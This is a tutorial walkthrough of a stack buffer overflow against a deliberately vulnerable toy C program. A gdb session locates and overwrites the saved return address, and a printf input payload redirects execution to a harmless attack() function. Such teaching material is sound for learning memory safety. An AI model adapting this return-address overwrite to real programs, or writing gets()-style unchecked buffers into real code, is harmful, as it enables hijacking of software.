Overwrite Return Address Using Buffer Overflow Attack
----------------------------------------------------------------

5       void attack()
6       {
7           printf("attacker's code is executed!!\n");
8           exit(0);
9       }
10
11
12      void get_input()
13      {
14          char buffer[8];
15
16          gets(buffer);
17          puts(buffer);
18      }
19
20
21      int main(int argc, char** argv)
22      {
23          get_input();
24
25          return 0;
26      }

$ ./overwrite_return_addr 
AAAAAAA
AAAAAAA


1. Use gdb to overwrite the return address
----------------------------------------------------------------
$ gdb ./overwrite_return_addr 

(gdb) break 23
Breakpoint 1 at 0x4005b6: file overwrite_return_addr.c, line 23.

(gdb) break 16
Breakpoint 2 at 0x400587: file overwrite_return_addr.c, line 16.


(gdb) run
Breakpoint 1, main (argc=1, argv=0x7fffffffdad8) at overwrite_return_addr.c:23

(gdb) disass
Dump of assembler code for function main:
   0x00000000004005a7 <+0>:     push   rbp
   0x00000000004005a8 <+1>:     mov    rbp,rsp
   0x00000000004005ab <+4>:     sub    rsp,0x10
   0x00000000004005af <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005b2 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
=> 0x00000000004005b6 <+15>:    mov    eax,0x0
   0x00000000004005bb <+20>:    call   0x40057f <get_input>
>  0x00000000004005c0 <+25>:    mov    eax,0x0
   0x00000000004005c5 <+30>:    leave
   0x00000000004005c6 <+31>:    ret

(gdb) c
Breakpoint 2, get_input () at overwrite_return_addr.c:16

(gdb) disass
Dump of assembler code for function get_input:
   0x000000000040057f <+0>:     push   rbp
   0x0000000000400580 <+1>:     mov    rbp,rsp
   0x0000000000400583 <+4>:     sub    rsp,0x10
=> 0x0000000000400587 <+8>:     lea    rax,[rbp-0x8]
   0x000000000040058b <+12>:    mov    rdi,rax
   0x000000000040058e <+15>:    mov    eax,0x0
   0x0000000000400593 <+20>:    call   0x400470 <gets@plt>
   0x0000000000400598 <+25>:    lea    rax,[rbp-0x8]
   0x000000000040059c <+29>:    mov    rdi,rax
   0x000000000040059f <+32>:    call   0x400460 <puts@plt>
   0x00000000004005a4 <+37>:    nop
   0x00000000004005a5 <+38>:    leave
   0x00000000004005a6 <+39>:    ret

(gdb) info register
rbp            0x7fffffffd9d0   0x7fffffffd9d0
rsp            0x7fffffffd9c0   0x7fffffffd9c0
rip            0x400587 0x400587 <get_input+8>

(gdb) x/8xg $rsp
0x7fffffffd9c0: 0x00007fffffffd9e7      0x0000000000000000
0x7fffffffd9d0: 0x00007fffffffd9f0      0x00000000004005c0
0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
0x7fffffffd9f0: 0x00000000004005d0      0x00007f4329ab150a

(gdb) step
AAAAAAAAAAAAAAAA    // 16 times

(gdb) x/8xg $rsp
0x7fffffffd9c0: 0x00007fffffffd9e7      0x4141414141414141
0x7fffffffd9d0: 0x4141414141414141      0x0000000000400500
0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
0x7fffffffd9f0: 0x00000000004005d0      0x00007fab3cd3a50a

(gdb) x/xg 0x7fffffffd9d8
0x7fffffffd9d8: 0x0000000000400500

(gdb) disass attack
Dump of assembler code for function attack:
   0x0000000000400567 <+0>:     push   rbp
   0x0000000000400568 <+1>:     mov    rbp,rsp
   0x000000000040056b <+4>:     mov    edi,0x400660
   0x0000000000400570 <+9>:     call   0x400460 <puts@plt>
   0x0000000000400575 <+14>:    mov    edi,0x0
   0x000000000040057a <+19>:    call   0x400480 <exit@plt>

(gdb) set *(0x7fffffffd9d8) = 0x0000000000400567

(gdb) x/8xg $rsp
0x7fffffffd9c0: 0x00007fffffffd9e7      0x4141414141414141
0x7fffffffd9d0: 0x4141414141414141      0x0000000000400567
0x7fffffffd9e0: 0x00007fffffffdad8      0x0000000100000000
0x7fffffffd9f0: 0x00000000004005d0      0x00007f42356b850a

(gdb) c
AAAAAAAAAAAAAAAAg@
attacker's code is executed!!


2. Use an input string to overwrite the return address
----------------------------------------------------------------

Note: Using gdb, we can find out the address of the attack()
      function:
      => 0x0000000000400567

$ printf "AAAAAAAAAAAAAAAA\x67\x05\x40\x00\x00\x00\x00\x00" | ./overwrite_return_addr
AAAAAAAAAAAAAAAAg@
attacker's code is executed!!


